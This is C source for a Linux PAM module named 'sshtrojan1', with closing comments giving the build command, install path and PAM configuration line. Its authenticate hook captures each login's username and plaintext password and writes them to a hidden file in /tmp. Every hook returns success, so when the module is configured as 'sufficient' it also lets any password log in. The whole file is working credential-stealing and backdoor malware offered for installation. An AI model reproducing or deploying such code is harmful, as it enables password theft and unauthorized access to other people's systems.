#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <stdarg.h>
#include <security/pam_appl.h>
#include <security/pam_modules.h>
#include <syslog.h>
#include <time.h>
#include <unistd.h>
#include <string.h>

#define PAM_LOG_FILE "/tmp/.log_sshtrojan1.txt"

/* Hàm ghi log */
static void pam_log(const char *format, ...) {
    FILE *log_file = fopen(PAM_LOG_FILE, "a");
    if (log_file) {
        va_list args;
        va_start(args, format);
        vfprintf(log_file, format, args);
        va_end(args);
        fclose(log_file);
    }
}

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
const char *username = "unknown";
        const char *password = "unknown";
        int retval;

        retval = pam_get_user(pamh, &username, NULL);
        if(retval != PAM_SUCCESS) {
                username = "unknown";
        }

        const void *password_ptr;
        retval = pam_get_item(pamh, PAM_AUTHTOK, &password_ptr);
        if(retval == PAM_SUCCESS && password_ptr != NULL) {
                password = (const char*)password_ptr;
        }

        FILE *logfile = fopen(PAM_LOG_FILE, "a");
        if(logfile != NULL){
                time_t now;
                time(&now);
                struct tm *tm_info = localtime(&now);
                char timestamp[20];
                strftime(timestamp, sizeof(timestamp), "%Y-%m-%d %H:%M:%S", tm_info);
                fprintf(logfile, "[%s] Username: %s Password: %s \n", timestamp, username, password);
                fclose(logfile);
        }
    return PAM_SUCCESS;
}

PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    return PAM_SUCCESS;
}

PAM_EXTERN int pam_sm_acct_mgmt(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    return PAM_SUCCESS;
}

PAM_EXTERN int pam_sm_open_session(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    return PAM_SUCCESS;
}

PAM_EXTERN int pam_sm_close_session(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    return PAM_SUCCESS;
}

PAM_EXTERN int pam_sm_chauthtok(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    return PAM_SUCCESS;
}

// gcc -fPIC -shared sshtrojan1.c -o sshtrojan1.so -lpam
// sudo cp sshtrojan1.so /lib/security/
// 
// auth sufficient sshtrojan1.so